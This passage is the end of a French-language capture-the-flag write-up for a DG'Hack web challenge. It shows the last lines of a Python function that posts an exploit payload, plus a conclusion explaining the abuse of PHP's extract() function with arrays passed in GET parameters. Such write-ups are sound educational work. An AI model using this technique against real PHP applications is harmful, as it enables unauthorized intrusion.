</span></span><span class="line"><span class="cl">    <span class="n">rep</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;User-Agent&#39;</span><span class="p">:</span><span class="n">USER_AGENT</span><span class="p">},</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;url&#39;</span><span class="p">:</span><span class="n">payload</span><span class="p">})</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">rep</span><span class="o">.</span><span class="n">text</span>
</span></span></code></pre></div><p>Et voilà!</p>
<p><img src="./assets/Capture_8.PNG" alt=""></p>
<h2 id="conclusion">Conclusion</h2>
<p>Ce challenge web a été un de mes préférés de cette édition du DG&rsquo;Hack et ce, pour plusieurs raisons, il exploitait un mécanisme de <code>PHP</code> que je ne connaissais pas en passant par l&rsquo;usage abusif de la fonction <code>extract</code> ainsi que de la possibilité de passer des tableaux entiers dans les paramètres de requêtes <code>GET</code>. Et il faisait aussi référence à d&rsquo;autres mauvaises pratiques de <code>PHP</code> comme l&rsquo;usage des simples guillemets lors de l&rsquo;inteprolation de variables.</p>
</div>
  
    <div class="mt-16">

</div>
  
</article>
      </div>
    </main><footer class="fixed left-0 bottom-0 w-full bg-base px-page-gutter">
  <div class="flex justify-center items-center h-footer-height">
    <div
      class="flex flex-row w-full max-w-content justify-between lowercase italic gap-3"
    >
      <nav>
        <ul class="flex text-md space-x-3 sm:space-x-6">
          
        </ul>
      </nav>
      <span class="text-muted hidden md:block">
        &copy;
        2023
        <a
          href="https://github.com/ntk148v/hugo-toigian"
          class="font-bold hover:underline"
          >hugo-toigian</a
        >
      </span>
      <div id="header-theme-button">
        <svg
          id="dark_mode_btn"
          class="hidden toolbox-btn"
          width="18px"
          height="18px"
          xmlns="http://www.w3.org/2000/svg"
          fill="none"
          viewBox="0 0 24 24"
          stroke-width="1.5"
          stroke="currentColor"
        >
          <path
            stroke-linecap="round"
            stroke-linejoin="round"
            d="M21.752 15.002A9.718 9.718 0 0118 15.75c-5.385 0-9.75-4.365-9.75-9.75 0-1.33.266-2.597.748-3.752A9.753 9.753 0 003 11.25C3 16.635 7.365 21 12.75 21a9.753 9.753 0 009.002-5.998z"
          />
        </svg>
        <svg
          id="light_mode_btn"
          class="hidden toolbox-btn"
          width="18px"
          height="18px"
          xmlns="http://www.w3.org/2000/svg"
          fill="none"
          viewBox="0 0 24 24"
          stroke-width="1.5"
          stroke="currentColor"
        >
          <path
            stroke-linecap="round"
            stroke-linejoin="round"
            d="M12 3v2.25m6.364.386l-1.591 1.591M21 12h-2.25m-.386 6.364l-1.591-1.591M12 18.75V21m-4.773-4.227l-1.591 1.591M5.25 12H3m4.227-4.773L5.636 5.636M15.75 12a3.75 3.75 0 11-7.5 0 3.75 3.75 0 017.5 0z"
          />
        </svg>
      </div>
    </div>
  </div>
</footer>
</body>
</html>
